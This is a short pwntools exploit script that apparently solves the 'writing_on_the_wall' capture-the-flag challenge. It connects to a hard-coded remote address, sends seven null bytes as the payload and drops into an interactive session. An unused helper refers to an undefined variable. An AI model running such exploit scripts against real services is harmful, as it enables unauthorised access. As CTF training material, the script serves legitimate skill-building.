#!/usr/bin/env python3

from pwn import *

exe = ELF("writing_on_the_wall_patched", checksec=False)
libc = ELF("./glibc/libc.so.6", checksec=False)
ld = ELF("./glibc/ld-linux-x86-64.so.2", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
context.log_level 	= "WARNING"
# context.log_level 	= "DEBUG"
isDebug = False
shouldPrint = True

gs = '''
break main
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def print_result(result):
	if shouldPrint:
		print(result)
  
def pass_input(input:bytes):
    io.sendlineafter(b">> ", input)
		
#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
# ip_offset = find_ip_offset(cyclic(200))
# ip_offset = 56
# io = start_local(isDebug)

######## REMOTE ########
remote_address = "94.237.57.1:57160"
io = remote(remote_address.split(":")[0], int(remote_address.split(":")[1]))
io.timeout = 0.1

pass_input(b'\x00' * 7)

io.interactive()
